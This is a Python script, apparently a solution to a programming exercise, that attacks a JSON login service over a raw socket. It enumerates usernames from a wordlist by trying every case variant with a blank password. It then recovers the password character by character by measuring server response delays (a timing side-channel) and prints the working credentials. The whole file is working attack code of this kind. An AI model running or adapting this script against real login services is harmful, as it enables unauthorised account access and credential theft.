import socket
import sys
from itertools import product
import os
import json
from datetime import datetime

base_path = os.path.dirname(__file__)
login_list_file = os.path.join(base_path, 'logins.txt')

# Get hostname and port
args = sys.argv
hostname, port = args[-2:]
address = (hostname, int(port))

# Create Socket and connect
with socket.socket() as connection_socket:
    login_found = False
    password_found = False
    connection_socket.connect(address)
    with open(login_list_file, 'r') as f:
        logins = f.readlines()
    # Check Through all logins and Pass blank password
    for phrase in logins:
        phrase = phrase.strip()
        # Generate all possible combinations
        for login in set(product(*zip(phrase.lower(), phrase.upper()))):
            login = "".join(login)
            data = {'login': login, 'password': ' '}
            data = json.dumps(data)
            # Send Password
            connection_socket.send(data.encode())
            # Get Response
            response = json.loads(connection_socket.recv(1024).decode())
            # Break if Login is Found
            if response['result'] == 'Wrong password!':
                login_found = True
                break
        if login_found:
            break

    # Create Password One by One
    i = 0
    abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    password = abc[i]
    while not password_found:
        for char in abc:
            password = password[:i] + char + password[i+1:]
            data = {'login': login, 'password': password}
            data = json.dumps(data)
            # Start Time Measurement
            start = datetime.now()
            # Send Password
            connection_socket.send(data.encode())
            # Get Response
            response = json.loads(connection_socket.recv(1024).decode())['result']
            # Find Time Difference
            finish = datetime.now()
            difference = finish - start
            # If time different is large current character is correct
            if difference.microseconds >= 2000 and response == 'Wrong password!':
                break
            # Print Data and Break if Password is Found
            if response == 'Connection success!':
                print(data)
                password_found = True
                break
        if password_found:
            break
        i += 1
        password += abc[0]
